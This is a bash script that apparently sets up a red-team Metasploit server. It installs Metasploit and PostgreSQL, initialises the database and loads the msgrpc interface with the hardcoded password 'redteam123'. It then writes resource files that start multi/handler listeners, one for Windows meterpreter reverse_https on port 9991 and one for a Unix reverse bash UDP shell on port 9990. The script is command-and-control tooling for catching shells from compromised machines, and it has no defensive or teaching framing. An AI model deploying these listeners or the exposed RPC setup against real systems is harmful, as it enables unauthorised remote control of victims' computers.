#!/usr/bin/bash

if [ ! -f "updated.txt" ]; then
    ./apt_update_and_flag.sh
fi



# First make sure postgres is installed
apt install -y postgresql metasploit-framework

# Iniitalize the db
/usr/bin/msfdb init

mkdir /root/metasploit_workingdir
cd /root/metasploit_workingdir

#Set up
#Once installed how to run standing tasks?
touch startup.rc

#msfrpc against the db
echo "load msgrpc Pass='redteam123'" >> startup.rc


#Generate Callbacks

#rc script to start listeners

#WINDOWS windows/METERPRETER/reverse_https
echo "use exploit/multi/handler" > reverse_windows_meterp_https_9991.rc
echo "set PAYLOAD windows/meterpreter/reverse_https" >> reverse_windows_meterp_https_9991.rc
echo "set LPORT 9991" >> reverse_windows_meterp_https_9991.rc
echo "set LHOST 0.0.0.0" >> reverse_windows_meterp_https_9991.rc
echo "exploit -j" >> reverse_windows_meterp_https_9991.rc
echo "resource reverse_windows_meterp_https_9991.rc" >> startup.rc

#UDP SHELL ON 9990
echo "use exploit/multi/handler" > reverse_unix_bash_udp_9990.rc
echo "set PAYLOAD cmd/unix/reverse_bash_udp" >> reverse_unix_bash_udp_9990.rc
echo "set LPORT 9990" >> reverse_unix_bash_udp_9990.rc
echo "set LHOST 0.0.0.0" >> reverse_unix_bash_udp_9990.rc
echo "exploit -j" >> reverse_unix_bash_udp_9990.rc
echo "resource reverse_unix_bash_udp_9990.rc" >> startup.rc

